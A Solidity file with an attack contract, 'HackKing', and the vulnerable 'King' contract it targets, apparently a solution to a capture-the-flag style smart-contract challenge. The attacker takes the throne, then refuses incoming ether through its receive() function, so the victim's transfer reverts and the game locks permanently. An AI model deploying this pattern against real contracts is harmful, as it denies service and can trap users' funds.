// SPDX-License-Identifier: MIT
//important note : contractAdd.transfer(msg.value) is failing
//so instead used contractAdd.call{value: msg.value}("");
pragma solidity ^0.8.0;

contract HackKing {
    address owner;
    constructor() {
        owner = msg.sender;
    }
    function claimKingship(address payable contractAdd) public payable {
        King kingObj = King(contractAdd);
        require(msg.value > kingObj.prize(), "Insufficient Fund to claim Kingship");
        (bool success, ) = contractAdd.call{value: msg.value}("");
        require(success, "Transfer failed");
    }
    receive() external payable {
        require(msg.sender==owner, "Funds not accepted from others");
    }
}

pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}